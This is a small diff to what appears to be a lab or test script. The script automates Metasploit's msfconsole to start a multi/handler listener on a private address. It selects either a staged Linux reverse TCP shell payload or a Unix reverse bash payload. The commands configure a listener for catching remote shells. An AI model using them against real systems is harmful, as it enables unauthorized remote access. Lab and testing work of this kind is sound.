@@ -72,7 +72,12 @@ type_attacker() {
 
 type_attacker 'bin/msfconsole' C-m
 type_attacker 'use exploit/multi/handler' C-m
+if [[ "$PAYLOAD" == *staged* ]]
+then
+type_attacker 'set PAYLOAD linux/x64/shell/reverse_tcp' C-m
+else
 type_attacker 'set PAYLOAD cmd/unix/reverse_bash' C-m
+fi
 type_attacker 'set LHOST 10.2.0.201' C-m
 type_attacker 'run' C-m
 
